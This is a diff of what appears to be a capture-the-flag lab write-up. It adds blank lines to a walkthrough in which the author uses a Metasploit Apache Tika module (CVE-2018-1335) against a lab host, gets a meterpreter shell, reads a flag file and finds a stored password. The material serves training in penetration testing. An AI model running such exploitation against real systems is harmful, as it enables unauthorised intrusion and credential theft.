@@ -92,14 +92,21 @@ Description:
 
 References:
   https://www.exploit-db.com/exploits/46540
+  
   https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
+  
   https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E
+  
   https://nvd.nist.gov/vuln/detail/CVE-2018-1335
 
 msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rhosts 10.10.179.83
+
 rhosts => 10.10.179.83
+
 msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
+
 rport => 61777
+
 msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit
 
 meterpreter > 
@@ -109,12 +116,15 @@ meterpreter >
 Now to explore the file system and find the first flag.
 
 c:\Users\CyberLens\Desktop>type user.txt
+
 type user.txt
 
 I then did more exploring of the cyberlens dir, and came across this password:
 
 c:\Users\CyberLens\Documents\Management>type cyberlens-management.txt
+
 type cyberlens-management.txt
+
 Remember, manual enumeration is often key in an engagement ;)
 
 CyberLens
